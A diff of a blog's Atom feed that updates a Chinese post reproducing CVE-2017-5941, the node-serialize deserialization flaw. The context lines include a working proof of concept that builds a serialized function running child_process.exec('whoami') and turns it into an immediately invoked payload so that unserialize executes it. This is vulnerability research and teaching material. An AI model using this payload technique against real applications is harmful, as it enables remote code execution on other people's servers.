@@ -203,9 +203,9 @@
     <link href="http://chybeta.github.io/2017/11/01/Node-js%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9ACVE-2017-5941/"/>
     <id>http://chybeta.github.io/2017/11/01/Node-js中的反序列化漏洞：CVE-2017-5941/</id>
     <published>2017-11-01T10:14:53.000Z</published>
-    <updated>2017-11-01T12:57:58.931Z</updated>
+    <updated>2017-11-01T13:08:53.157Z</updated>
     
-    <content type="html"><![CDATA[<p>合上吧，水文一篇。<br>Node.js中的反序列化漏洞<br><a id="more"></a></p>
+    <content type="html"><![CDATA[<p>合上吧，水文一篇。<br>Node.js中的反序列化漏洞？<br>（Node.js：这锅我不背）<br><a id="more"></a></p>
 <h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>安装好node和npm后，安装一下主角node-serialize<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install node-serialize@0.0.4 --save</div></pre></td></tr></table></figure></p>
 <p>测试代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> chybeta = &#123;</div><div class="line">	<span class="attr">vuln</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'whoami'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>) </span>&#123;<span class="built_in">console</span>.log(stdout);&#125;);&#125;,</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">serResult = serialize.serialize(chybeta);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"serialize result:"</span>);</div><div class="line"><span class="built_in">console</span>.log(serResult+<span class="string">'\n'</span>);</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Direct unserialize:"</span>)</div><div class="line">serialize.unserialize(serResult);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"\n"</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Use IIFE to PWN it:"</span>)</div><div class="line">exp = serResult.substr(<span class="number">0</span>,serResult.length<span class="number">-2</span>) + <span class="string">"()"</span> + serResult.substr(<span class="number">-2</span>);</div><div class="line"><span class="built_in">console</span>.log(exp);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Exec whoami:"</span>)</div><div class="line">serialize.unserialize(exp);</div></pre></td></tr></table></figure></p>
 <p>运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">node index.js</div></pre></td></tr></table></figure></p>
@@ -229,11 +229,12 @@
 <li><a href="https://paper.seebug.org/213/" target="_blank" rel="external">利用 Node.js 反序列化漏洞远程执行代码</a></li>
 <li><a href="http://www.4hou.com/technology/3457.html" target="_blank" rel="external">NodeJS反序列化RCE漏洞的完美利用</a></li>
 </ul>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>无聊玩一玩。</p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;合上吧，水文一篇。&lt;br&gt;Node.js中的反序列化漏洞&lt;br&gt;
+      &lt;p&gt;合上吧，水文一篇。&lt;br&gt;Node.js中的反序列化漏洞？&lt;br&gt;（Node.js：这锅我不背）&lt;br&gt;
     
     </summary>
     
